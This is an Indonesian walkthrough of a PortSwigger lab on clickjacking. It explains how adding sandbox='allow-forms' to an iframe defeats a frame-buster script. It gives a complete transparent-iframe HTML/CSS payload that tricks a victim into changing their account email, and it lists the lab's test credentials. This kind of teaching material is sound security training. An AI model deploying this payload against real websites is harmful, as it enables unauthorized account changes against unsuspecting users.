# Clickjacking dengan Skrip Frame Buster

Lab ini dilindungi oleh frame buster yang mencegah situs web untuk di-iframe. Bisakah Anda melewati frame buster tersebut dan melakukan serangan clickjacking yang mengubah alamat email pengguna?

Untuk menyelesaikan lab ini, buatlah beberapa HTML yang membingkai halaman akun dan menipu pengguna agar mengubah alamat email mereka dengan mengklik "Click me". Lab dianggap selesai ketika alamat email berhasil diubah.

Anda dapat masuk ke akun Anda sendiri menggunakan kredensial berikut:  
**Username:** wiener  
**Password:** peter

**Catatan:** Korban akan menggunakan Chrome, jadi pastikan untuk menguji exploit Anda di browser tersebut.

**Hint:** Anda tidak dapat mendaftarkan alamat email yang sudah digunakan oleh pengguna lain. Jika Anda mengubah alamat email Anda sendiri saat menguji exploit, pastikan Anda menggunakan alamat email yang berbeda untuk exploit akhir yang Anda berikan kepada korban.

---------------------------------------------

Referensi:

- [Clickjacking - PortSwigger](https://portswigger.net/web-security/clickjacking)

![img](images/Clickjacking%20with%20a%20frame%20buster%20script/1.png)

---------------------------------------------

Jika profil pengguna diakses dengan parameter “email”, field email akan terisi otomatis:

![img](images/Clickjacking%20with%20a%20frame%20buster%20script/2.png)

Jika kita mencoba menggunakan payload dari lab sebelumnya, muncul error berikut:

![img](images/Clickjacking%20with%20a%20frame%20buster%20script/3.png)

Kita dapat menambahkan `sandbox="allow-forms"` ke kode iframe untuk menghindari masalah ini, sehingga kita dapat mengeksekusi serangan dengan payload seperti ini:

```html
<style>
    iframe {
        position: relative;
        width: 1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 470px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>CLICK ME</div>
<iframe sandbox="allow-forms" src="https://0a84007b0486e431826ebbf6006e007d.web-security-academy.net/my-account?email=test@test.com"></iframe>
```

![img](images/Clickjacking%20with%20a%20frame%20buster%20script/4.png)

**Penjelasan:**

1. **Style CSS:**  
   - **iframe:**  
     - **`position: relative;`** dan **`width: 1000px; height: 700px;`**: Mengatur ukuran dan posisi iframe.
     - **`opacity: 0.1;`**: Membuat iframe hampir tidak terlihat namun tetap interaktif.
     - **`z-index: 2;`**: Menetapkan tingkat tumpukan agar iframe berada di atas elemen lain.
   - **div:**  
     - **`position: absolute; top: 470px; left: 60px;`**: Menempatkan div "CLICK ME" di posisi yang strategis di atas iframe.
     - **`z-index: 1;`**: Menetapkan tingkat tumpukan agar div berada di bawah iframe, namun tetap terlihat oleh pengguna.

2. **Div "CLICK ME":**  
   - Elemen ini berfungsi sebagai umpan untuk menarik perhatian pengguna agar mengkliknya. Ketika pengguna mengklik "CLICK ME", mereka sebenarnya mengklik area pada iframe yang tersembunyi yang dapat memicu tombol "Update email".

3. **Iframe:**  
   - **`sandbox="allow-forms"`**: Menambahkan atribut sandbox dengan izin untuk formulir memungkinkan iframe untuk mengirimkan formulir meskipun ada frame buster.
   - **`src="https://0a84007b0486e431826ebbf6006e007d.web-security-academy.net/my-account?email=test@test.com"`**: Memuat halaman akun target dengan parameter `email=test@test.com`, yang akan mengubah alamat email pengguna jika formulir tersebut dikirimkan.
   - **`opacity: 0.1;`**: Membuat iframe hampir transparan sehingga pengguna tidak menyadari interaksi yang sebenarnya terjadi di dalamnya.

Dengan teknik ini, pengguna yang mengunjungi halaman yang berisi payload ini akan secara tidak sadar mengubah alamat email mereka karena mereka mengklik "CLICK ME" yang secara tidak sengaja mengklik tombol "Update email" di dalam iframe tersembunyi. Penambahan atribut `sandbox="allow-forms"` memungkinkan iframe melewati perlindungan frame buster, sehingga serangan clickjacking dapat berhasil dilakukan meskipun situs target memiliki perlindungan tersebut.
